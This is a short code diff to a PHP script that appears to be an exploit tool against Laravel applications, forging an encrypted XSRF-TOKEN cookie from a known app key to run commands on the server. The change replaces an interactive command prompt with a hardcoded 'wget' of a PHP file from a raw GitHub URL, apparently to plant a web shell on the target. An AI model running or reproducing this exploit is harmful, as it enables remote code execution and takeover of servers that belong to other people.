@@ -195,9 +195,9 @@ if ($wibu->app_key != null)
 {
     while (true)
     {
-        $cmd = readline('id');
+        
         $app = str_replace('base64:', '', $wibu->app_key);
-        $command = $Func->GeneratePayload($cmd, $function, $method);
+        $command = $Func->GeneratePayload("wget https://raw.githubusercontent.com/izx2023/z/main/14x.php", $function, $method);
         $serialize = $Func->Serialize($app, $command);
         $header = array(
             'Cookie: XSRF-TOKEN=' . $serialize
